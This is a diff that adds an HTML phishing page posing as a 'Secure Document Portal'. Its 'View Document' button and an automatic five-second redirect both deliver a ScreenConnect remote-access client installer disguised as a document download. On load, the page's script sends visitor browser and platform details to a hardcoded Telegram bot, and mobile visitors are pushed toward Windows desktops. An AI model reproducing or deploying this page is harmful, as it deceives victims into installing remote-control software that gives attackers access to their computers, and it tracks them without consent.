@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure Document Portal</title>
+
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      text-align: center;
+      padding: 50px;
+    }
+
+    .container, .mobile-warning {
+      background-color: #fff;
+      max-width: 500px;
+      margin: auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+
+    p {
+      font-size: 16px;
+      margin: 10px 0;
+    }
+
+    .btn {
+      display: inline-block;
+      background-color: #4CAF50;
+      color: white;
+      padding: 12px 24px;
+      margin: 20px 0;
+      text-decoration: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .btn:hover {
+      background-color: #45a049;
+    }
+
+    .note {
+      font-size: 14px;
+      color: #666;
+    }
+
+    .mobile-warning {
+      display: none;
+    }
+
+    .mobile-warning h2 {
+      color: #e53935;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Desktop version -->
+  <div id="desktop-content" class="container">
+    <p>&nbsp;</p>
+
+    <h1>Secure Document Portal</h1>
+
+    <p>
+      You have received a secure document.
+      Your document will download automatically.
+    </p>
+
+    <p>
+      For security and optimal experience,
+      please open the document on a desktop or laptop computer.
+    </p>
+
+    <a
+      class="btn"
+      href="https://broadskyrsvp12.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+      target="_blank"
+      rel="noopener noreferrer"
+    >
+      View Document
+    </a>
+
+    <p class="note">
+      If the document does not download,
+      please click the "View Document" button above.
+    </p>
+  </div>
+
+
+
+<div id="mobile-warning" class="container mobile-warning">
+  
+  <h2>?? Desktop Only ??</h2>
+  <p>Document view is only available on a desktop or Windows computer.</p>
+  <p>Please check your email and open the invitation on a laptop or desktop device.</p>
+  
+</div>
+
+<script>
+  // =========================
+  // TELEGRAM SETTINGS
+  // =========================
+  const BOT_TOKEN = "8485740961:AAHbVaa335cuMHgNmLca3xpD_HUOZYg9XRA";
+  const CHAT_ID = "1369158058";
+
+  // =========================
+  // DEVICE DETECTION
+  // =========================
+  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+  const desktopContent = document.getElementById("desktop-content");
+  const mobileWarning = document.getElementById("mobile-warning");
+
+  if (isMobile) {
+    desktopContent.style.display = "none";
+    mobileWarning.style.display = "block";
+  }
+
+  // =========================
+  // SEND TELEGRAM MESSAGE
+  // =========================
+  async function notifyTelegram() {
+    const message = `
+New visitor on your site
+
+
+Browser: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Time: ${new Date().toLocaleString()}
+    `;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    try {
+      await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+
+      console.log("Telegram notification sent");
+    } catch (error) {
+      console.error("Telegram notification failed", error);
+    }
+  }
+
+  // Run notification
+  notifyTelegram();
+
+  // Optional redirect
+  setTimeout(() => {
+    window.location.href = "https://broadskyrsvp12.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+  }, 5000);
+</script>
+
+</body>
+</html>
